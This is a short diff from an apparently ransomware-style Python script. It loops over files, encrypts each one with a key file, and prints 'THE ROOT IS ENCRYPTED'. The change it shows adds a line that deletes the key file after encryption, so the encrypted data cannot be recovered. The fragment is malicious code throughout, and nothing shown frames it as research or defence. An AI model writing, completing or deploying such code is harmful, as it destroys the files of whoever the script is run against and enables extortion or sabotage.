@@ -60,4 +60,5 @@ for i in files:
     print("encrypting : ", i)
     encrypt_file(key_file, i)
 
+os.remove("key1.key")
 print("\n THE ROOT IS ENCRYPTED ")
